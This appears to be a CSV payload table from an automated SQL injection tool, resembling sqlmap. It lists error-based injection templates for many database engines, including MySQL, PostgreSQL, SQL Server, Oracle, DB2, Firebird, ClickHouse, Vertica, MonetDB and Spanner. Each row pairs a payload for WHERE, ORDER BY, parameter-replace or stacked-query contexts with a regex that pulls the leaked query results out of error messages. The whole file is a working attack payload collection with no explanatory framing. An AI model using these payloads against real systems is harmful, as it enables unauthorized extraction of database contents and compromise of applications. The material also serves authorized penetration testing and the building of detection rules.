title,stype,level,risk,clause,where,vector,request/payload,response/grep,details/dbms/0,details/dbms_version,request/comment,details/dbms/1
MonetDB AND error-based - WHERE or HAVING clause,2,3,1,1,1,AND [RANDNUM]=('[DELIMITER_START]'||([QUERY])||'[DELIMITER_STOP]'),AND [RANDNUM]=('[DELIMITER_START]'||(SELECT CASE [RANDNUM] WHEN [RANDNUM] THEN CODE(49) ELSE CODE(48) END)||'[DELIMITER_STOP]'),[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP],MonetDB,,,
MonetDB OR error-based - WHERE or HAVING clause,2,4,3,1,2,OR [RANDNUM]=('[DELIMITER_START]'||([QUERY])||'[DELIMITER_STOP]'),OR [RANDNUM]=('[DELIMITER_START]'||(SELECT CASE [RANDNUM] WHEN [RANDNUM] THEN CODE(49) ELSE CODE(48) END)||'[DELIMITER_STOP]'),[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP],MonetDB,,,
Vertica AND error-based - WHERE or HAVING clause,2,3,1,1,1,AND [RANDNUM]=CAST('[DELIMITER_START]'||([QUERY])::varchar||'[DELIMITER_STOP]' AS NUMERIC),AND [RANDNUM]=CAST('[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN BITCOUNT(BITSTRING_TO_BINARY('1')) ELSE BITCOUNT(BITSTRING_TO_BINARY('0')) END))::varchar||'[DELIMITER_STOP]' AS NUMERIC),[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP],Vertica,,,
Vertica OR error-based - WHERE or HAVING clause,2,4,3,1,2,OR [RANDNUM]=CAST('[DELIMITER_START]'||([QUERY])::varchar||'[DELIMITER_STOP]' AS NUMERIC),OR [RANDNUM]=CAST('[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN BITCOUNT(BITSTRING_TO_BINARY('1')) ELSE BITCOUNT(BITSTRING_TO_BINARY('0')) END))::varchar||'[DELIMITER_STOP]' AS NUMERIC),[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP],Vertica,,,
IBM DB2 AND error-based - WHERE or HAVING clause,2,3,1,1,1,"AND [RANDNUM]=RAISE_ERROR('70001','[DELIMITER_START]'||([QUERY])||'[DELIMITER_STOP]')","AND [RANDNUM]=RAISE_ERROR('70001','[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) FROM SYSIBM.SYSDUMMY1)||'[DELIMITER_STOP]')",[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP],IBM DB2,,,
IBM DB2 OR error-based - WHERE or HAVING clause,2,4,3,1,1,"OR [RANDNUM]=RAISE_ERROR('70001','[DELIMITER_START]'||([QUERY])||'[DELIMITER_STOP]')","OR [RANDNUM]=RAISE_ERROR('70001','[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) FROM SYSIBM.SYSDUMMY1)||'[DELIMITER_STOP]')",[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP],IBM DB2,,,
"ClickHouse AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause",2,3,1,"1,2,3,9",1,AND [RANDNUM]=('[DELIMITER_START]'||CAST(([QUERY]) AS String)||'[DELIMITER_STOP]'),AND [RANDNUM]=('[DELIMITER_START]'||(CASE WHEN ([RANDNUM]=[RANDNUM]) THEN '1' ELSE '0' END)||'[DELIMITER_STOP]'),[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP],ClickHouse,,,
"ClickHouse OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause",2,4,3,"1,2,3,9",1,OR [RANDNUM]=('[DELIMITER_START]'||CAST(([QUERY]) AS String)||'[DELIMITER_STOP]'),OR [RANDNUM]=('[DELIMITER_START]'||(CASE WHEN ([RANDNUM]=[RANDNUM]) THEN '1' ELSE '0' END)||'[DELIMITER_STOP]'),[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP],ClickHouse,,,
"Spanner AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause",2,5,1,"1,2,3,8,9",1,"AND ERROR(CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]')) IS NOT NULL","AND ERROR(CONCAT('[DELIMITER_START]',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN '1' ELSE '0' END)),'[DELIMITER_STOP]')) IS NOT NULL",[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP],Spanner,,,
"Spanner OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause",2,5,3,"1,2,3,8,9",1,"OR ERROR(CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]')) IS NOT NULL","OR ERROR(CONCAT('[DELIMITER_START]',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN '1' ELSE '0' END)),'[DELIMITER_STOP]')) IS NOT NULL",[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP],Spanner,,,
MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE),2,2,1,"1,2,3,4,5",1,"PROCEDURE ANALYSE(EXTRACTVALUE([RANDNUM],CONCAT('\','[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]')),1)","PROCEDURE ANALYSE(EXTRACTVALUE([RANDNUM],CONCAT('\','[DELIMITER_START]',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END)),'[DELIMITER_STOP]')),1)",[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP],MySQL,>= 5.1,,
MySQL >= 5.5 error-based - Parameter replace (BIGINT UNSIGNED),2,5,1,"1,2,3,9",3,"(SELECT 2*(IF((SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]','x'))s), 8446744073709551610, 8446744073709551610)))","(SELECT 2*(IF((SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]','x'))s), 8446744073709551610, 8446744073709551610)))",[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP],MySQL,>= 5.5,,
MySQL >= 5.5 error-based - Parameter replace (EXP),2,5,1,"1,2,3,9",3,"EXP(~(SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]','x'))x))","EXP(~(SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]','x'))x))",[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP],MySQL,>= 5.5,,
MySQL >= 5.6 error-based - Parameter replace (GTID_SUBSET),2,3,1,"1,2,3,9",3,"GTID_SUBSET(CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]'),[RANDNUM])","GTID_SUBSET(CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]'),[RANDNUM])",[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP],MySQL,>= 5.6,,
MySQL >= 5.7.8 error-based - Parameter replace (JSON_KEYS),2,5,1,"1,2,3,9",3,"JSON_KEYS((SELECT CONVERT((SELECT CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]')) USING utf8)))","JSON_KEYS((SELECT CONVERT((SELECT CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]')) USING utf8)))",[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP],MySQL,>= 5.7.8,,
MySQL >= 5.0 error-based - Parameter replace (FLOOR),2,4,1,"1,2,3,9",3,"(SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)","(SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)",[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP],MySQL,>= 5.0,,
MySQL >= 5.1 error-based - Parameter replace (UPDATEXML),2,4,1,"1,2,3,9",3,"(UPDATEXML([RANDNUM],CONCAT('.','[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]'),[RANDNUM1]))","(UPDATEXML([RANDNUM],CONCAT('.','[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]'),[RANDNUM1]))",[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP],MySQL,>= 5.1,,
MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE),2,2,1,"1,2,3,9",3,"(EXTRACTVALUE([RANDNUM],CONCAT('\','[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]')))","(EXTRACTVALUE([RANDNUM],CONCAT('\','[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]')))",[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP],MySQL,>= 5.1,,
PostgreSQL error-based - Parameter replace,2,2,1,"1,2,3,9",3,(CAST('[DELIMITER_START]'||([QUERY])::text||'[DELIMITER_STOP]' AS NUMERIC)),(CAST('[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END))::text||'[DELIMITER_STOP]' AS NUMERIC)),[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP],PostgreSQL,,,
PostgreSQL error-based - Parameter replace (GENERATE_SERIES),2,5,1,"1,2,3,9",3,(CAST('[DELIMITER_START]'||([QUERY])::text||'[DELIMITER_STOP]' AS NUMERIC)),"(CAST('[DELIMITER_START]'||(SELECT 1 FROM GENERATE_SERIES([RANDNUM],[RANDNUM],CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) LIMIT 1)::text||'[DELIMITER_STOP]' AS NUMERIC))",[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP],PostgreSQL,,,
Microsoft SQL Server/Sybase error-based - Parameter replace,2,3,1,"1,3",3,"(CONVERT(INT,(SELECT '[DELIMITER_START]'+([QUERY])+'[DELIMITER_STOP]')))","(CONVERT(INT,(SELECT '[DELIMITER_START]'+(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN '1' ELSE '0' END))+'[DELIMITER_STOP]')))",[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP],Microsoft SQL Server,,,Sybase
Microsoft SQL Server/Sybase error-based - Parameter replace (integer column),2,4,1,"1,3",3,(SELECT '[DELIMITER_START]'+([QUERY])+'[DELIMITER_STOP]'),(SELECT '[DELIMITER_START]'+(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN '1' ELSE '0' END))+'[DELIMITER_STOP]'),[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP],Microsoft SQL Server,,,Sybase
Oracle error-based - Parameter replace,2,3,1,"1,3",3,"(SELECT UPPER(XMLType(CHR(60)||CHR(58)||'[DELIMITER_START]'||(REPLACE(REPLACE(REPLACE(([QUERY]),' ','[SPACE_REPLACE]'),'$','[DOLLAR_REPLACE]'),'@','[AT_REPLACE]'))||'[DELIMITER_STOP]'||CHR(62))) FROM DUAL)",(SELECT UPPER(XMLType(CHR(60)||CHR(58)||'[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) FROM DUAL)||'[DELIMITER_STOP]'||CHR(62))) FROM DUAL),[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP],Oracle,,,
Firebird error-based - Parameter replace,2,4,1,"1,3",3,(SELECT [RANDNUM]=('[DELIMITER_START]'||([QUERY])||'[DELIMITER_STOP]')),(SELECT [RANDNUM]=('[DELIMITER_START]'||(SELECT CASE [RANDNUM] WHEN [RANDNUM] THEN 1 ELSE 0 END FROM RDB$DATABASE)||'[DELIMITER_STOP]')),[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP],Firebird,,,
IBM DB2 error-based - Parameter replace,2,4,1,"1,3",3,"RAISE_ERROR('70001','[DELIMITER_START]'||([QUERY])||'[DELIMITER_STOP]')","RAISE_ERROR('70001','[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) FROM SYSIBM.SYSDUMMY1)||'[DELIMITER_STOP]')",[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP],IBM DB2,,,
"MySQL >= 5.5 error-based - ORDER BY, GROUP BY clause (BIGINT UNSIGNED)",2,5,1,"2,3",1,",(SELECT [RANDNUM] FROM (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]','x'))s), 8446744073709551610, 8446744073709551610)))x)",",(SELECT [RANDNUM] FROM (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]','x'))s), 8446744073709551610, 8446744073709551610)))x)",[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP],MySQL,>= 5.5,,
"MySQL >= 5.5 error-based - ORDER BY, GROUP BY clause (EXP)",2,5,1,"2,3",1,",(SELECT [RANDNUM] FROM (SELECT EXP(~(SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]','x'))x)))s)",",(SELECT [RANDNUM] FROM (SELECT EXP(~(SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]','x'))x)))s)",[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP],MySQL,>= 5.5,,
"MySQL >= 5.6 error-based - ORDER BY, GROUP BY clause (GTID_SUBSET)",2,3,1,"2,3",1,",GTID_SUBSET(CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]'),[RANDNUM])",",GTID_SUBSET(CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]'),[RANDNUM])",[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP],MySQL,>= 5.6,,
"MySQL >= 5.7.8 error-based - ORDER BY, GROUP BY clause (JSON_KEYS)",2,5,1,"2,3",1,",(SELECT [RANDNUM] FROM (SELECT JSON_KEYS((SELECT CONVERT((SELECT CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]')) USING utf8))))x)",",(SELECT [RANDNUM] FROM (SELECT JSON_KEYS((SELECT CONVERT((SELECT CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]')) USING utf8))))x)",[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP],MySQL,>= 5.7.8,,
"MySQL >= 5.0 error-based - ORDER BY, GROUP BY clause (FLOOR)",2,5,1,"2,3",1,",(SELECT 1 FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)",",(SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)",[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP],MySQL,>= 5.0,,
"MySQL >= 5.1 error-based - ORDER BY, GROUP BY clause (EXTRACTVALUE)",2,3,1,"2,3",1,",EXTRACTVALUE([RANDNUM],CONCAT('\','[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]'))",",EXTRACTVALUE([RANDNUM],CONCAT('\','[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]'))",[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP],MySQL,>= 5.1,,
"MySQL >= 5.1 error-based - ORDER BY, GROUP BY clause (UPDATEXML)",2,5,1,"2,3",1,",UPDATEXML([RANDNUM],CONCAT('.','[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]'),[RANDNUM1])",",UPDATEXML([RANDNUM],CONCAT('.','[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]'),[RANDNUM1])",[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP],MySQL,>= 5.1,,
"MySQL >= 4.1 error-based - ORDER BY, GROUP BY clause (FLOOR)",2,5,1,"2,3",1,",(SELECT [RANDNUM] FROM (SELECT ROW([RANDNUM],[RANDNUM1])>(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM (SELECT [RANDNUM2] UNION SELECT [RANDNUM3] UNION SELECT [RANDNUM4] UNION SELECT [RANDNUM5])a GROUP BY x))s)",",(SELECT [RANDNUM] FROM (SELECT ROW([RANDNUM],[RANDNUM1])>(SELECT COUNT(*),CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM (SELECT [RANDNUM2] UNION SELECT [RANDNUM3] UNION SELECT [RANDNUM4] UNION SELECT [RANDNUM5])a GROUP BY x))s)",[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP],MySQL,>= 4.1,,
"PostgreSQL error-based - ORDER BY, GROUP BY clause",2,3,1,"2,3",1,",(CAST('[DELIMITER_START]'||([QUERY])::text||'[DELIMITER_STOP]' AS NUMERIC))",",(CAST('[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END))::text||'[DELIMITER_STOP]' AS NUMERIC))",[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP],PostgreSQL,,,
"PostgreSQL error-based - ORDER BY, GROUP BY clause (GENERATE_SERIES)",2,5,1,"2,3",1,",(CAST('[DELIMITER_START]'||([QUERY])::text||'[DELIMITER_STOP]' AS NUMERIC))",",(CAST('[DELIMITER_START]'||(SELECT 1 FROM GENERATE_SERIES([RANDNUM],[RANDNUM],CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) LIMIT 1)::text||'[DELIMITER_STOP]' AS NUMERIC))",[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP],PostgreSQL,,,
Microsoft SQL Server/Sybase error-based - ORDER BY clause,2,4,1,3,1,",(SELECT [RANDNUM] WHERE [RANDNUM]=CONVERT(INT,(SELECT '[DELIMITER_START]'+([QUERY])+'[DELIMITER_STOP]')))",",(SELECT [RANDNUM] WHERE [RANDNUM]=CONVERT(INT,(SELECT '[DELIMITER_START]'+(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN '1' ELSE '0' END))+'[DELIMITER_STOP]')))",[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP],Microsoft SQL Server,,,Sybase
"Oracle error-based - ORDER BY, GROUP BY clause",2,4,1,"2,3",1,",(SELECT UPPER(XMLType(CHR(60)||CHR(58)||'[DELIMITER_START]'||(REPLACE(REPLACE(REPLACE(([QUERY]),' ','[SPACE_REPLACE]'),'$','[DOLLAR_REPLACE]'),'@','[AT_REPLACE]'))||'[DELIMITER_STOP]'||CHR(62))) FROM DUAL)",",(SELECT UPPER(XMLType(CHR(60)||CHR(58)||'[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) FROM DUAL)||'[DELIMITER_STOP]'||CHR(62))) FROM DUAL)",[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP],Oracle,,,
Firebird error-based - ORDER BY clause,2,5,1,3,1,",(SELECT [RANDNUM]=('[DELIMITER_START]'||([QUERY])||'[DELIMITER_STOP]'))",",(SELECT [RANDNUM]=('[DELIMITER_START]'||(SELECT CASE [RANDNUM] WHEN [RANDNUM] THEN 1 ELSE 0 END FROM RDB$DATABASE)||'[DELIMITER_STOP]'))",[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP],Firebird,,,
IBM DB2 error-based - ORDER BY clause,2,5,1,3,1,",RAISE_ERROR('70001','[DELIMITER_START]'||([QUERY])||'[DELIMITER_STOP]')",",RAISE_ERROR('70001','[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) FROM SYSIBM.SYSDUMMY1)||'[DELIMITER_STOP]')",[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP],IBM DB2,,,
Microsoft SQL Server/Sybase error-based - Stacking (EXEC),2,2,1,1-8,1,;DECLARE @[RANDSTR] NVARCHAR(4000);SET @[RANDSTR]=(SELECT '[DELIMITER_START]'+([QUERY])+'[DELIMITER_STOP]');EXEC @[RANDSTR],;DECLARE @[RANDSTR] NVARCHAR(4000);SET @[RANDSTR]=(SELECT '[DELIMITER_START]'+(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN '1' ELSE '0' END))+'[DELIMITER_STOP]');EXEC @[RANDSTR],[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP],Microsoft SQL Server,,--,Sybase
